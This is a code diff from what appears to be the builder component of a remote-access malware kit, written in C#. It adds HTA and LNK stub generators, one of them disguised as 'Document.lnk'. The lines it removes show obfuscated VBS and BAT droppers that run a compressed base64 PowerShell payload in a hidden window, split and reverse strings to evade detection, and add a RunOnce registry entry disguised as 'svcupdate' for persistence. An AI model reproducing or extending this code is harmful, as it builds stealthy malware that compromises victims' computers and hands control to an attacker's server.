@@ -2846,14 +2846,16 @@ namespace WpfApp
             bool silentMode = builderSilentCheckBox?.IsChecked == true;
             BuilderOutput($"Generating VBS stub — {serverIp}:{port} (silent={silentMode})");
 
-            string vbsCode = GenerateVbsCode(port, password, serverIp, encKey, silentMode);
-
-            if (vbsCode.StartsWith("' ERROR"))
+            string ps1Code = GenerateStubCode(port, password, serverIp, encKey, silentMode);
+            if (ps1Code.StartsWith("# Template"))
             {
-                BuilderOutput("ERROR: VBS stub generation failed — template not found");
+                BuilderOutput("ERROR: VBS stub generation failed — PS1 template not found");
                 UpdateStatus("VBS stub generation failed.");
                 return;
             }
+
+            string vbsCode = StubBuilders.VbsStubBuilder.Generate(ps1Code);
+            AppendLog($"VBS payload: {vbsCode.Length} chars");
 
             BuilderOutput($"VBS stub generated ({vbsCode.Length} chars)");
 
@@ -2878,130 +2880,6 @@ namespace WpfApp
             }
         }
 
-        private string GenerateVbsCode(string port, string password, string serverIp, string encryptionKey, bool silentMode = false)
-        {
-            string ps1Code = GenerateStubCode(port, password, serverIp, encryptionKey, silentMode);
-            if (ps1Code.StartsWith("# Template"))
-            {
-                AppendLog("ERROR: Cannot generate VBS — PS1 stub generation failed.");
-                return "' ERROR: PS1 stub generation failed.";
-            }
-
-            byte[] ps1Bytes = Encoding.UTF8.GetBytes(ps1Code);
-            using var ms = new MemoryStream();
-            using (var gz = new GZipStream(ms, CompressionMode.Compress, true))
-                gz.Write(ps1Bytes, 0, ps1Bytes.Length);
-            byte[] compressed = ms.ToArray();
-            string b64Compressed = Convert.ToBase64String(compressed);
-
-            string psCmd = "$b=[Convert]::FromBase64String('" + b64Compressed + "');$ms=[IO.MemoryStream]::new($b);$gz=[IO.Compression.GzipStream]::new($ms,[IO.Compression.CompressionMode]::Decompress);iex([IO.StreamReader]::new($gz).ReadToEnd())";
-
-            AppendLog($"PS1 compressed: {ps1Bytes.Length} -> {compressed.Length} bytes ({(double)compressed.Length / ps1Bytes.Length * 100:F1}%)");
-            AppendLog($"VBS payload: {psCmd.Length} chars");
-
-            return GenerateObfuscatedVbs(psCmd);
-        }
-
-        private static string GenerateObfuscatedVbs(string b64Payload)
-        {
-            var rng = new Random();
-            var sb = new StringBuilder();
-
-            string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(6, 10));
-
-            // ---- junk at top ----
-            int junkCount = rng.Next(3, 6);
-            for (int i = 0; i < junkCount; i++)
-            {
-                string jv = VarName();
-                sb.AppendLine($"Dim {jv}: {jv} = {rng.Next(100, 9999)} * {rng.Next(2, 99)}");
-            }
-
-            // ---- split b64 into chunks and reverse each ----
-            int chunkCount = rng.Next(4, 8);
-            int chunkSize = (int)Math.Ceiling((double)b64Payload.Length / chunkCount);
-            var chunkVars = new List<string>();
-
-            for (int i = 0; i < chunkCount; i++)
-            {
-                int start = i * chunkSize;
-                if (start >= b64Payload.Length) break;
-                int len = Math.Min(chunkSize, b64Payload.Length - start);
-                string chunk = b64Payload.Substring(start, len);
-                char[] rev = chunk.ToCharArray(); Array.Reverse(rev);
-                string vn = VarName();
-                chunkVars.Add(vn);
-                sb.AppendLine($"Dim {vn}: {vn} = \"{new string(rev)}\"");
-            }
-
-            // ---- junk interleave ----
-            for (int i = 0; i < 2; i++)
-            {
-                string jv = VarName();
-                sb.AppendLine($"Dim {jv}: {jv} = \"{Guid.NewGuid().ToString("N").Substring(0, 8)}\"");
-            }
-
-            // ---- reconstruct payload var ----
-            string payloadVar = VarName();
-            sb.Append($"Dim {payloadVar}: {payloadVar} = ");
-            for (int i = 0; i < chunkVars.Count; i++)
-            {
-                sb.Append($"StrReverse({chunkVars[i]})");
-                if (i < chunkVars.Count - 1) sb.Append(" & ");
-            }
-            sb.AppendLine();
-
-            // ---- build "powershell" from Chr() codes ----
-            string psStr = "powershell";
-            string psVar = VarName();
-            sb.Append($"Dim {psVar}: {psVar} = ");
-            var psCodes = new List<string>();
-            foreach (char c in psStr)
-                psCodes.Add($"Chr({(int)c})");
-            sb.Append(string.Join(" & ", psCodes));
-            sb.AppendLine();
-
-            // ---- build "-NoP -W Hidden -Command" from Chr() codes ----
-            string argStr = "-NoP -W Hidden -Command";
-            string argVar = VarName();
-            sb.Append($"Dim {argVar}: {argVar} = ");
-            var argCodes = new List<string>();
-            foreach (char c in argStr)
-                argCodes.Add($"Chr({(int)c})");
-            sb.Append(string.Join(" & ", argCodes));
-            sb.AppendLine();
-
-            // ---- build "WScript.Shell" from Chr() codes ----
-            string comStr = "WScript.Shell";
-            string comVar = VarName();
-            sb.Append($"Dim {comVar}: {comVar} = ");
-            var comCodes = new List<string>();
-            foreach (char c in comStr)
-                comCodes.Add($"Chr({(int)c})");
-            sb.Append(string.Join(" & ", comCodes));
-            sb.AppendLine();
-
-            // ---- junk interleave ----
-            for (int i = 0; i < 2; i++)
-            {
-                string jv = VarName();
-                sb.AppendLine($"Dim {jv}: {jv} = Array({rng.Next(1, 9)}, {rng.Next(10, 99)})");
-            }
-
-            // ---- build final command (wrap payload in double quotes) ----
-            string cmdVar = VarName();
-            sb.AppendLine($"Dim {cmdVar}: {cmdVar} = {psVar} & \" \" & {argVar} & \" \" & Chr(34) & {payloadVar} & Chr(34)");
-
-            // ---- create shell object and execute ----
-            string shellVar = VarName();
-            sb.AppendLine($"Dim {shellVar}");
-            sb.AppendLine($"Set {shellVar} = CreateObject({comVar})");
-            sb.AppendLine($"{shellVar}.Run {cmdVar}, 0, False");
-            sb.AppendLine($"Set {shellVar} = Nothing");
-
-            return sb.ToString();
-        }
-
         private void GenerateBatButton_Click(object sender, RoutedEventArgs e)
         {
             UpdateStatus("Generating BAT stub...");
@@ -3024,14 +2902,16 @@ namespace WpfApp
             bool silentMode = builderSilentCheckBox?.IsChecked == true;
             BuilderOutput($"Generating BAT stub — {serverIp}:{port} (silent={silentMode})");
 
-            string batCode = GenerateBatCode(port, password, serverIp, encKey, silentMode);
-
-            if (batCode.StartsWith("@rem ERROR"))
+            string ps1Code = GenerateStubCode(port, password, serverIp, encKey, silentMode);
+            if (ps1Code.StartsWith("# Template"))
             {
-                BuilderOutput("ERROR: BAT stub generation failed — template not found");
+                BuilderOutput("ERROR: BAT stub generation failed — PS1 template not found");
                 UpdateStatus("BAT stub generation failed.");
                 return;
             }
+
+            string batCode = StubBuilders.BatStubBuilder.Generate(ps1Code);
+            AppendLog($"BAT payload: {batCode.Length} chars");
 
             BuilderOutput($"BAT stub generated ({batCode.Length} chars)");
 
@@ -3056,160 +2936,124 @@ namespace WpfApp
             }
         }
 
-        private string GenerateBatCode(string port, string password, string serverIp, string encryptionKey, bool silentMode = false)
+        private void GenerateHtaButton_Click(object sender, RoutedEventArgs e)
         {
-            // Generate VBS stub (which already runs PowerShell silently with -W Hidden)
-            string vbsCode = GenerateVbsCode(port, password, serverIp, encryptionKey, silentMode);
-            if (vbsCode.StartsWith("' ERROR"))
+            UpdateStatus("Generating HTA stub...");
+            builderOutputTextBox.Text = "Ready to generate stub...";
+
+            string port = builderPortTextBox.Text.Trim();
+            string password = _builderActualPassword;
+            string serverIp = builderIpTextBox.Text.Trim();
+            string encKey = builderEncryptionKeyTextBox.Text.Trim();
+
+            if (!ValidateBuilderInputs())
             {
-                AppendLog("ERROR: Cannot generate BAT — VBS stub generation failed.");
-                return "@rem ERROR: VBS stub generation failed.";
+                BuilderOutput("ERROR: Validation failed — check inputs");
+                UpdateStatus("HTA stub generation failed.");
+                return;
             }
 
-            // Base64-encode the VBS content
-            byte[] vbsBytes = Encoding.UTF8.GetBytes(vbsCode);
-            string b64Vbs = Convert.ToBase64String(vbsBytes);
+            SaveSettings();
 
-            // PowerShell command: decode base64 → write .vbs → run silently via wscript.exe
-            string psCmd = "$d=[Convert]::FromBase64String($env:B641+$env:B642);$p=[IO.Path]::GetTempPath()+'sv.vbs';[IO.File]::WriteAllBytes($p,$d);Start-Process wscript.exe -ArgumentList $p -WindowStyle Hidden";
+            bool silentMode = builderSilentCheckBox?.IsChecked == true;
+            BuilderOutput($"Generating HTA stub — {serverIp}:{port} (silent={silentMode})");
 
-            AppendLog($"VBS payload b64: {b64Vbs.Length} chars");
+            string ps1Code = GenerateStubCode(port, password, serverIp, encKey, silentMode);
+            if (ps1Code.StartsWith("# Template"))
+            {
+                BuilderOutput("ERROR: HTA stub generation failed — PS1 template not found");
+                UpdateStatus("HTA stub generation failed.");
+                return;
+            }
 
-            return GenerateObfuscatedBat(b64Vbs, psCmd);
+            string htaCode = StubBuilders.HtaStubBuilder.Generate(ps1Code);
+            AppendLog($"HTA payload: {htaCode.Length} chars");
+
+            BuilderOutput($"HTA stub generated ({htaCode.Length} chars)");
+
+            var dialog = new SaveFileDialog
+            {
+                Filter = "HTML Application (*.hta)|*.hta",
+                DefaultExt = ".hta",
+                FileName = "Stub.hta"
+            };
+
+            if (dialog.ShowDialog() == true)
+            {
+                File.WriteAllText(dialog.FileName, htaCode);
+                AppendLog($"HTA stub saved to {dialog.FileName}");
+                BuilderOutput($"Saved: {dialog.FileName}");
+                UpdateStatus("HTA stub generated and saved.");
+            }
+            else
+            {
+                BuilderOutput("Save cancelled.");
+                UpdateStatus("HTA stub generated (not saved).");
+            }
         }
 
-        private static string GenerateObfuscatedBat(string b64Payload, string psCmd)
+        private void GenerateLnkButton_Click(object sender, RoutedEventArgs e)
         {
-            var rng = new Random();
-            var sb = new StringBuilder();
+            UpdateStatus("Generating LNK stub...");
+            builderOutputTextBox.Text = "Ready to generate stub...";
 
-            string VarName() => "x" + Guid.NewGuid().ToString("N").Substring(0, rng.Next(4, 8));
+            string port = builderPortTextBox.Text.Trim();
+            string password = _builderActualPassword;
+            string serverIp = builderIpTextBox.Text.Trim();
+            string encKey = builderEncryptionKeyTextBox.Text.Trim();
 
-            // ---- @echo off + setlocal ----
-            sb.AppendLine("@echo off");
-            sb.AppendLine("setlocal");
-
-            // ---- self-launch VBS to hide console window (relaunch silently via wscript.exe) ----
-            sb.AppendLine("if exist \"%temp%\\r.flag\" goto :main");
-            sb.AppendLine("cd. > \"%temp%\\r.flag\"");
-            sb.AppendLine("echo CreateObject(\"WScript.Shell\").Run \"\"\"%~f0\"\"\", 0, False > \"%temp%\\r.vbs\"");
-            sb.AppendLine("wscript.exe \"%temp%\\r.vbs\"");
-            sb.AppendLine("exit /b");
-            sb.AppendLine(":main");
-            sb.AppendLine("del \"%temp%\\r.flag\" \"%temp%\\r.vbs\" 2>nul");
-
-            // ---- RunOnce persistence (re-run stub on next login) ----
-            sb.AppendLine("reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\" /v \"svcupdate\" /d \"\\\"%~f0\\\"\" /f");
-
-            // ---- junk arithmetic at top ----
-            int junkCount = rng.Next(3, 6);
-            for (int i = 0; i < junkCount; i++)
+            if (!ValidateBuilderInputs())
             {
-                string v = VarName();
-                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}^{rng.Next(2, 99)}");
+                BuilderOutput("ERROR: Validation failed — check inputs");
+                UpdateStatus("LNK stub generation failed.");
+                return;
             }
 
-            // ---- obfuscate "powershell" by splitting into 3-4 parts ----
-            string psStr = "powershell";
-            int psParts = rng.Next(3, 5);
-            int psPartSize = (int)Math.Ceiling((double)psStr.Length / psParts);
-            var psVars = new List<string>();
-            for (int i = 0; i < psParts; i++)
+            SaveSettings();
+
+            bool silentMode = builderSilentCheckBox?.IsChecked == true;
+            string iconLocation = (lnkIconComboBox.SelectedItem as System.Windows.Controls.ComboBoxItem)?.Tag?.ToString() ?? "imageres.dll,3";
+            BuilderOutput($"Generating LNK stub — {serverIp}:{port} (silent={silentMode}, icon={iconLocation})");
+
+            string ps1Code = GenerateStubCode(port, password, serverIp, encKey, silentMode);
+            if (ps1Code.StartsWith("# Template"))
             {
-                int start = i * psPartSize;
-                if (start >= psStr.Length) break;
-                int len = Math.Min(psPartSize, psStr.Length - start);
-                string chunk = psStr.Substring(start, len);
-                string vn = VarName();
-                psVars.Add(vn);
-                sb.AppendLine($"set {vn}={chunk}");
+                BuilderOutput("ERROR: LNK stub generation failed — PS1 template not found");
+                UpdateStatus("LNK stub generation failed.");
+                return;
             }
 
-            // ---- obfuscate "-NoP -C" by splitting into 4-6 parts ----
-            string argStr = "-NoP -C";
-            int argParts = rng.Next(4, 7);
-            int argPartSize = (int)Math.Ceiling((double)argStr.Length / argParts);
-            var argVars = new List<string>();
-            for (int i = 0; i < argParts; i++)
+            byte[] lnkData = StubBuilders.LnkStubBuilder.Generate(ps1Code, iconLocation);
+            AppendLog($"LNK payload: {lnkData.Length} bytes");
+
+            if (lnkData == null)
             {
-                int start = i * argPartSize;
-                if (start >= argStr.Length) break;
-                int len = Math.Min(argPartSize, argStr.Length - start);
-                string chunk = argStr.Substring(start, len);
-                string vn = VarName();
-                argVars.Add(vn);
-                sb.AppendLine($"set {vn}={chunk}");
+                BuilderOutput("ERROR: LNK stub generation failed");
+                UpdateStatus("LNK stub generation failed.");
+                return;
             }
 
-            // ---- junk interleave ----
-            for (int i = 0; i < 2; i++)
+            BuilderOutput($"LNK stub generated ({lnkData.Length} bytes total)");
+
+            var dialog = new SaveFileDialog
             {
-                string v = VarName();
-                sb.AppendLine($"set {v}={Guid.NewGuid().ToString("N").Substring(0, 8)}");
-            }
+                Filter = "LNK Shortcut (*.lnk)|*.lnk",
+                DefaultExt = ".lnk",
+                FileName = "Document.lnk"
+            };
 
-            // ---- chunk the b64 payload into env vars (small chunks to avoid cmd.exe 8191 limit) ----
-            int chunkCount = Math.Max(8, (int)Math.Ceiling(b64Payload.Length / 1200.0));
-            int chunkSize = (int)Math.Ceiling((double)b64Payload.Length / chunkCount);
-            var b64Vars = new List<string>();
-            for (int i = 0; i < chunkCount; i++)
+            if (dialog.ShowDialog() == true)
             {
-                int start = i * chunkSize;
-                if (start >= b64Payload.Length) break;
-                int len = Math.Min(chunkSize, b64Payload.Length - start);
-                string chunk = b64Payload.Substring(start, len);
-                string vn = VarName();
-                b64Vars.Add(vn);
-                sb.AppendLine($"set {vn}={chunk}");
+                File.WriteAllBytes(dialog.FileName, lnkData);
+                AppendLog($"LNK stub saved to {dialog.FileName}");
+                BuilderOutput($"Saved: {dialog.FileName}");
+                UpdateStatus("LNK stub generated and saved.");
             }
-
-            // ---- more junk interleave ----
-            for (int i = 0; i < 2; i++)
+            else
             {
-                string v = VarName();
-                sb.AppendLine($"set /a {v}={rng.Next(100, 9999)}+{rng.Next(10, 999)}");
+                BuilderOutput("Save cancelled.");
+                UpdateStatus("LNK stub generated (not saved).");
             }
-
-            // ---- build PowerShell command that concatenates ALL chunk env vars directly ----
-            // No B64 reconstruction needed — PowerShell reads each chunk var and concatenates
-            string envConcat = string.Join("+", b64Vars.Select(v => "$env:" + v));
-            string fullPsCmd = psCmd.Replace("$env:B641+$env:B642", envConcat);
-
-            // ---- more junk ----
-            for (int i = 0; i < 2; i++)
-            {
-                string v = VarName();
-                sb.AppendLine($"set {v}={rng.Next(1000, 9999)}");
-            }
-
-            // ---- build command name from parts ----
-            string cmdVar1 = VarName();
-            sb.Append($"set {cmdVar1}=");
-            for (int i = 0; i < psVars.Count; i++)
-            {
-                sb.Append($"%{psVars[i]}%");
-            }
-            sb.AppendLine();
-
-            string cmdVar2 = VarName();
-            sb.Append($"set {cmdVar2}=");
-            for (int i = 0; i < argVars.Count; i++)
-            {
-                sb.Append($"%{argVars[i]}%");
-            }
-            sb.AppendLine();
-
-            // ---- junk ----
-            string jvLast = VarName();
-            sb.AppendLine($"set {jvLast}=%random%");
-
-            // ---- execute ----
-            sb.AppendLine($"%{cmdVar1}% %{cmdVar2}% \"{fullPsCmd}\"");
-
-            // ---- cleanup ----
-            sb.AppendLine("endlocal");
-
-            return sb.ToString();
         }
 
         private async void CompileExeButton_Click(object sender, RoutedEventArgs e)
